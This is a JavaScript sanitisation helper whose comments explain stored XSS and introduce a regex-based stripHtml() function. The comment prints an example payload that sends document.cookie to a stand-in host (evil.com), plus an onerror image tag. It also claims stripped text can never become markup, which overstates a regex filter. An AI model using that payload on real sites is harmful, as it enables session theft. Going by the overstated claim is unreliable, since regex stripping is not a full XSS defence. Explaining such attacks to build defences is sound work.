// src/utils/sanitize.js
//
// ── Why this file exists ───────────────────────────────────────────
//
// Zod validators check the SHAPE of input (is it a string? how long?).
// They don't check the CONTENT for things that are dangerous to store
// and later display, like HTML tags.
//
// Imagine a customer puts this in their order "notes" field:
//   <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
//
// Right now, that string passes validation fine — it's just text under
// 500 characters. It gets saved to the database as-is. Later, if an
// admin dashboard ever renders order.notes directly into a webpage
// without escaping it, that <script> tag would EXECUTE in the admin's
// browser. This is called "stored XSS" (Cross-Site Scripting) — the
// attack payload is stored once, but fires every time someone views it.
//
// stripHtml() removes anything that looks like an HTML tag (<...>)
// before the value is saved. "<script>alert(1)</script>" becomes
// "alert(1)" — plain text, harmless, can never be interpreted as markup.
//
// This is defense-in-depth: the FRONTEND should also escape output,
// but the backend shouldn't trust that every future consumer of this
// API will do so correctly.

/**
 * Remove HTML tags from a string.
 * Returns the input unchanged if it isn't a string (e.g. undefined,
 * so zod's .optional() still works correctly).
 */
function stripHtml(value) {
  if (typeof value !== 'string') return value;

  // Matches "<" followed by any characters that are not ">" followed by ">"
  // e.g. "<script>", "<img src=x onerror=alert(1)>", "</b>"
  return value.replace(/<[^>]*>/g, '');
}

module.exports = { stripHtml };
